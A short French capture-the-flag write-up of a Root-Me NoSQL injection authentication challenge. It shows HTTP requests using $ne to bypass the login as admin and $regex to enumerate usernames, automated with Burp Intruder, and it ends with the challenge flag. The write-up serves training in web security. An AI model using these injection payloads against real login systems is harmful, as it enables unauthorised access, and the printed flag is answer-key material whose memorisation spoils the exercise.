# CTF NoSQL injection – Authentification

Première injection NoSQL

Je me muni t’un petit tableau de commandes :

 ![[NoSQL_injection_-_Authentification_01_057b5c934c.png]]

On essaie le $ne dans le repeter :

GET /web-serveur/ch38/?login=admin&pass[$ne]=rien HTTP/1.1

	<!DOCTYPE html>

		<html xmlns="http://www.w3.org/1999/xhtml" lang="fr">

		<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>

				You are connected as : admin<br />

			</body>

		</html>

Parfait ca fonctionne, on va maintenant user de la fonction $regex

GET /web-serveur/ch38/?login[$regex]=^a&pass[$ne]=rien HTTP/1.1

Le (login[$regex]=^a) permet de sélectionner un username qui commence par a

Dans cette logique on va automatiser cette idée pour chercher un autre utilisateur :

Pour ce faire :

- On envoie une bonne réponse et une mauvaise au comparer pour voir les differences ; On va dans comparer puis on clique sur « Words » et la on voit des différences.
	- On a le mot « connected » dans la bonne réponse 
- Donc on va ensuite envoyer notre requête dans  « Intruder » 
	- Selectionner la lettre a modifier 🡪 add 🡪 ajouter les lettres voulues dans « payload configuratiuon » 🡪 settings 🡪 mettre le mot trouvé, donc ‘connected’ dans « Grep Match »
	- Lancer l’attaque
	- On voit une validation pour le f donc on va tester manuellement

Et on flag : flag{nosqli_no_secret_4_you}
